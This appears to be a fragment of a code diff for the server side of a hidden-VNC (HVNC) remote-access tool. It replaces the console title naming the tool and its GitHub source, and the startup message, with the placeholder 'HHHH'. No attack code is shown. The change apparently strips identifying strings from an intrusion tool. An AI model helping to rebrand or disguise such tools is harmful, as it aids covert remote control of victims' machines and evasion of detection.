@@ -15,14 +15,14 @@ int CALLBACK WinMain(HINSTANCE hInstance,
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);
 
-   SetConsoleTitle(TEXT("HVNC - github.com/Meltedd/HVNC"));
+   SetConsoleTitle(TEXT("HHHH - HHHH"));
 
    int port;
    std::cout << "[!] Server Port: ";
    std::cin >> port;
 
    std::system("CLS");
-   printf("[-] Starting HVNC Server...\n");
+   printf("[-] Starting HHHH Server...\n");
 
    if(!StartServer(port))
    {
